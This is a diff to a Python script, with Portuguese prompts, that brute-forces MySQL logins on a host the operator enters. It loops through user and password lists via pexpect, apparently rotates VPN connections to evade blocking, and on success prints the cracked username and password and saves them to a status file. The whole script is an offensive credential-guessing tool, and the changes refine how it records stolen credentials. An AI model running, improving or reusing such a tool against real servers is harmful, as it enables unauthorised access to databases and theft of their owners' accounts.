@@ -6,8 +6,8 @@ import vpn
 import users
 from pathlib import Path
 
-passwordsl = passwords.passwords_
-usersl = users.users_
+passwordsl = passwords.load_passwords()
+usersl = users.load_users()
 openvpn_enter = vpn.openvpn_enter_()
 
 finded = False
@@ -21,13 +21,14 @@ ERROR_1698 = 5
 ERROR_1045 = 6
 END = 7
 TIMEOUT = 8
+MYSQL_TIMEOUT = 30
 
 
 def update_status(line_number, value):
     status_file = Path("/tmp/status")
     with status_file.open("r", encoding="utf-8") as f:
         lines = f.readlines()
-    while len(lines) < 5:
+    while len(lines) <= line_number:
         lines.append("\n")
     lines[line_number] = f"{value}\n"
     temporary_file = status_file.with_suffix(".tmp")
@@ -48,7 +49,7 @@ def expect_state(process, patterns):
 i = int(input("Qual o valor inicial do usuário: "))
 j = int(input("Qual o valor inicial da senha: "))
 
-destino = input("Qual o destino: ")
+host = input("Qual o destino: ")
 
 next_ = random.randint(30, 45)
 next5 = 5
@@ -63,7 +64,7 @@ while i < len(usersl):
 
         update_status(2, j)
 
-        process = pexpect.spawn("mysql", ["-u", usersl[i], "-p", destino], encoding="utf-8", timeout=10)
+        process = pexpect.spawn("mysql", ["-u", usersl[i], "-p", host], encoding="utf-8", timeout=MYSQL_TIMEOUT)
 
         result = expect_state(
             process,
@@ -98,13 +99,19 @@ while i < len(usersl):
             LOGIN_SUCCESS_MYSQL_PT,
             LOGIN_SUCCESS_PROMPT,
         ):
+            user1 = usersl[i]
             password = passwordsl[j]
+
+            print(user1)
             print(password)
+
             process.close()
 
             finded = True
 
             update_status(3, "True")
+            update_status(5, user1)
+            update_status(6, password)
 
             break
 
